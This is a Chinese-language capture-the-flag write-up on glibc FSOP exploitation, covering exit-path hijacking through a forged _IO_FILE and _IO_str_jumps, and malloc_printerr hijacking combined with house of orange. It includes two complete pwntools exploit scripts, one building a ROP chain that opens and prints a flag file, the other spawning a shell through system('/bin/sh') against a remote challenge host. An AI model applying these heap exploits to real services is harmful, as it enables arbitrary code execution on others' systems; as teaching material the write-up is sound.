0x00 前置知识
=========

（1）IO\_File相关知识：参考这个[博客](https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop#vtable%E5%8A%AB%E6%8C%81)，写的真的很详细，~但是和利用毛关系都没有~

（2）fsop有关利用：感觉就没有几个师傅写了fsop的利用，个人感觉[大师傅](https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/)写的很好

（3）如何查找\_IO\_str\_jumps:这个是为了绕过vtable的检查机制（好像是从2.24开始的），然而并没有libc.sym\['\_IO\_str\_jumps'\],需要我们靠一点技巧去找

\_IO\_str\_jumps指向很多函数，可以说是一个函数表，其内部0x20偏移处为\_IO\_str\_underflow能够通过打印符号表查找到

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-1b566b28e99f1f0d371ab0cf9e99bc022f2c644a.png)

同时通过search -p能够查找到存储指针的位置（即\_IO\_str\_jumps内部）

一般来说是最下面那个，因为要比如下这个东西的地址更高

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f173d15933387a541cc5e649fd1078d296455908.png)

（4）house of orange

这个利用来源于2016年台湾举办的某个ctf的同名的题，主要是利用堆溢出，将top\_chunk的size改小（为了不使用mmap分配堆块），然后申请一块比top\_chunk大的堆块。这样就可把top\_chunk放入unsorted bin

0x01 exit劫持
===========

exit的调用路径
---------

exit-&gt;\_\_run\_exit\_handlers-&gt;\_IO\_cleanup-&gt;\_IO\_flush\_all\_lockp-&gt;stderr-&gt;stderr+0xd8-&gt;......(省略的为io\_list\_all为头的链表及其调用)

利用思路
----

通过修改libc.sym\['*IO\_2\_1\_stderr*'\] + 0x68为fake\_io\_file，达到劫持exit正常调用流程的目的。并且将fake\_io\_file的0xd8（即vtable）修改为\_IO\_str\_jumps（2.24以后就有检查机制，之前的话可以修改为任意值）达到调用over\_flow的目的，以此设置rdx寄存器的值并call malloc函数，结合提前修改malloc\_hook为setcontext来实现堆上rop

其中有几个比较重要的汇编指令
--------------

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-f7f239ee2730220ab80e7a058b1dbe3b908230c1.png)

**将rbx寄存器置为stderr**

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-cb56cb4d7b8b8f2cbbfde304b65499de6be8a350.png)

**stderr+0x68是chain，连入fake\_io\_file**

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-a0611b942ae10b68b22576f913b00099824900ee.png)

**把rax寄存器置为str\_jumps**

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-4466d868cdbb88d9738692d542ed27955e6ba1c6.png)

**设置好参数准备跳转**

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-6eebadeab5654ec2dc4bd89398210387b7e71d39.png)

rax为**跳转到over\_flow**

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-0ead8554ee052fd3eb6942693b3f8c254e90c104.png)

**设置rdx寄存器**

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-5f417defcee4f18168b4b100bdb573e73b305b38.png)

0x02 例题
=======

【bytectf2020】gun

exp
---

直接贴fmyy师傅的exp，其中涉及了srop，还没有学。。。不过改成正常的系统调用也可出

```php
from pwn import*
context.arch = "amd64"
p = process('./gun')
libc =ELF('./libc-2.31.so')

def z():
    gdb.attach(p)

def menu(ch):
    p.sendlineafter('Action>',str(ch))

def new(size,content):
    menu(3)
    p.sendlineafter('price:',str(size))
    p.sendlineafter('Name:',content)

def load(index):
    menu(2)
    p.sendlineafter('load?',str(index))

def free(times):
    menu(1)
    p.sendlineafter('time: ',str(times))

p.sendlineafter('Your name: ','nameless')

##leak libc
for i in range(3):
    new(0x10,'') #0 1 2
new(0x420,'nameless') #3
new(0x420,'nameless') #4
new(0x10,'nameless') #5
load(4)
load(3)
free(2)
new(0x20,'') #3
load(3)
free(1)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00'))-0x1c502d-(libc.sym['__libc_start_main']+243)
log.info('LIBC:\t' + hex(libc_base))

##set libc_func
free_hook = libc_base + libc.sym['__free_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']

##leak heap
new(0x20,'F'*0x10 + '\n') #3
load(3)
free(1)
p.recvuntil('F'*0x10)
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x2C0 - 0x60
log.info('HEAP:\t' + hex(heap_base))

## set gadget
pop_rdi_ret = libc_base + 0x26B72
pop_rdx_r12 = libc_base + 0x11c1e1
pop_rsi_ret = libc_base + 0x27529
pop_rax_ret = libc_base + 0x4A550

## set libc_ables
jmp_rsi  = libc_base + 0x1105bd
syscall = libc_base + libc.sym['syscall']
target = libc_base + libc.sym['_IO_2_1_stdin_']
address = libc.sym['__free_hook'] + libc_base
IO_str_jumps = libc_base + 0x1ED560
Open = libc_base + libc.symbols["open"]
Read = libc_base + libc.symbols["read"]
Puts = libc_base + libc.symbols['puts']
free_hook = address

##set fake_io
IO  = '\x00'*0x28
IO += p64(heap_base + 0x360 + 0xE0) ##rdx
IO  = IO.ljust(0xD8,'\x00')
IO += p64(IO_str_jumps)

##
read = libc_base + libc.sym['read']
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = address
frame.rdx = 0x2000
frame.rsp = address
frame.rip = Read
orw  = p64(pop_rdi_ret)+p64(free_hook + 0xF8)
orw += p64(pop_rsi_ret)+p64(0)
orw += p64(Open)
orw += p64(pop_rdi_ret) + p64(3)
orw += p64(pop_rdx_r12) + p64(0x30) + p64(0)
orw += p64(pop_rsi_ret) + p64(free_hook+0x100)
orw += p64(Read)
orw += p64(pop_rdi_ret)+p64(free_hook+0x100)
orw += p64(Puts)
orw  = orw.ljust(0xF8,'\x00')
orw += './flag\x00\x00'
IO += str(frame)

##
for i in range(3):
    load(i)
free(3)
new(0x3E0,IO + '\n') #0
new(0x31,p64(0) + p64(0x21) + '\x00'*0x18 + p64(0x21) + '\n') #1
free(1)
load(1)
free(1)
new(0x31,p64(0) + p64(0x21) + p64(libc_base + libc.sym['_IO_2_1_stderr_'] + 0x68) + '\n')
new(0x10,'FMYY\n')
new(0x10,p64(heap_base + 0x360) + '\n')
load(1)
load(2)
free(2)
new(0x31,p64(0) + p64(0x21) + p64(malloc_hook) + '\n')
new(0x10,'FMYY\n')
new(0x10,p64(libc_base + libc.sym['setcontext'] + 61) + '\n')   
z()
menu(4)

p.sendlineafter('Goodbye!',orw)
p.interactive()
```

### 调试记录手扎

环境配置的是glibc\_all\_in\_one下的2.31 9\_版本

主要是调一调看看运行流程  
下面是偏移，方便阅读的师傅调试

```php
exit：0x7ffff7dfe0b5
__run_exit_handlers：0x7ffff7e20bdb
_IO_cleanup：0x7ffff7e20b30
_IO_flush_all_lockp：0x7ffff7e6cf04    +136处把RBX赋值为stderr，stderr+0x68为chain的位置，可以double free劫持它到fake_io ; +225 把rax设置为rbx+0xd8
_IO_str_overflow：0x7ffff7e6ccaf rdi==rbx
malloc:0x7ffff7e6dba8 
```

0x03 malloc\_printerr劫持
=======================

一般是和unsorted bin attack结合起来用，触发malloc error来fsop

利用路径
----

2.23

malloc-&gt;\_int\_malloc-&gt;\_\_libc\_message-&gt;abort-&gt;\_IO\_flush\_all\_lockp-&gt;system('/bin/sh')

2.24及以后

malloc-&gt;\_int\_malloc-&gt;\_\_libc\_message-&gt;abort-&gt;\_IO\_flush\_all\_lockp-&gt;over\_flow-&gt;malloc\_hook-&gt;setcontext

利用思路
----

首先让unsorted bin里有且仅有一个堆块（所以2.23可以结合house of orange 打）修改一个unsorted bin 里的堆块的bk指针为IO\_list\_all

并且利用堆溢出等手段修改该堆块的size为0x60（为啥后面会讲），然后malloc即可在把这个堆块放入smallbin之后触发malloc\_error，进入\_IO\_flush\_all\_lockp

这里面的汇编啥的前面讲exit利用的时候详细记录过了

主要是这个rbx+0x68,一开始的rbx是main+88,加上0x68就是+198了，这个正好是small bin中0x60 size的chunk的表头，那么后续的mov rax,rbx+0xd8啥的就可以直接调用堆上预设的值了

还有一个需要注意的地方，伪造的fake\_io,它的0x28位置要比0x20大，具体是因为io\_file的结构如下

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-b3306ebe88e9934815eba47c226aadf83e8820a6.png)

需要绕过

```php
1.((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)

或者是
2.
_IO_vtable_offset (fp) == 0 
&& fp->_mode > 0 
&& (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
```

肯定第一种要好绕过一点

而且，通过io\_flush\_lock\_up的源码分析

```php
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;
#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif
  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
        _IO_flockfile (fp);
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)/*一些检查，需要绕过*/
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base))/*也可以绕过这个*/
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/
        result = EOF;
      if (do_lock)
        _IO_funlockfile (fp);
      run_fp = NULL;
    }
#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif
  return result;
}
```

发现如果一直绕不过这个检查，会从io\_list\_all一直往下取链表的成员，直至为0

这就是为啥俺一开始在gdb里调半天一直mov rbx，rbx+0x68直到为0的原因

例题
--

BUUOJ-house of orange

保护
--

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-d607665b72a7f1be15b3479292506a21a25571bd.png)

ida
---

### main

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-762a1124cb2984179e146b31315d60d57d02c4a2.png)

发现没有free函数，考虑使用house of orange 构造1个free的堆块，具体就是改写top\_chunk（防止使用mmap分配内存）,然后申请一个比它大的堆块，就会把top\_chunk free

### add

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-07a3b27901f92e75077c65380e0a9124bebd7428.png)

很寻常，不过限制了add个数为4。而且未初始化指针，可以leak\_libc和heap

### edit

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-c96889f0fa60733b558809aada4575839d660470.png)

也是限制了edit的个数为3，改写的大小是我们指定的，所以存在堆溢出

### show

![](https://shs3.b.qianxin.com/attack_forum/2022/04/attach-52cb2b5b83311fc3d93544c3b9e749b17c8553e3.png)

存在的意义就是为了leak

### 思路

模板题还写啥思路.......

~学了fsop和house of orange 还不会可以remake了~

exp
---

```php
from pwn import *
context.log_level='debug'
##r=process('./orange')
r=remote('node4.buuoj.cn',26752)
libc=ELF('./libc-2.23.so')

def z():
    gdb.attach(r)

def cho(num):
    r.sendlineafter("Your choice : ",str(num))

def add(size,con):
    cho(1)
    r.sendlineafter('Length of name :',str(size))
    r.sendlineafter('Name :',con)
    r.sendlineafter('Price of Orange:','1')
    r.sendlineafter('Color of Orange:','1')

def edit(size,con):
    cho(3)
    r.sendlineafter("Length of name :",str(size))  
    r.sendlineafter("Name:",con)
    r.sendlineafter("Price of Orange: ",'1')
    r.sendlineafter("Color of Orange: ",'1')  

def show():
    cho(2)

##free_top_chunk
add(0x30,'nameless')
pd = 'a'*0x30 + p64(0) + p64(0x21) +'a'*16+ p64(0)+ p64(0xf80)
edit(len(pd)+1,pd)
add(0x1000,'nameless')

##leak_libc
add(0x400,'nameles')
show()
r.recvuntil("Name of house : ")
r.recvuntil('nameles\n')
libcbase=u64(r.recv(6).ljust(8,'\x00'))-0x3a4948-(libc.sym['__libc_start_main']+240)

##set lib_functions
_IO_list_all=libcbase+libc.sym['_IO_list_all']
system=libcbase+libc.sym['system']

##leak_heap
edit(0x400,'nameless'+'nameles')
show()
r.recvuntil("Name of house : ")
r.recvuntil('nameles\n')
heap=u64(r.recv(6).ljust(8,'\x00'))-0xe0
log.success('libcbase:'+hex(libcbase))
log.success('heap:'+hex(heap))

##fsop
pd='a'*0x400
pd+=p64(0)+p64(0x21)+p64(0x0000001f00000001)+p64(0)
fake_io='/bin/sh\x00'+p64(0x60)+p64(0)+p64(_IO_list_all-0x10)
fake_io+=p64(0)+p64(1)
fake_io=fake_io.ljust(0xc0,'\x00')
pd+=fake_io
pd+=p64(0)*3
pd+=p64(heap+0x5e8)
pd+=p64(0)*2+p64(system)
edit(0x800,pd)
##z()
cho(1)
r.interactive()
```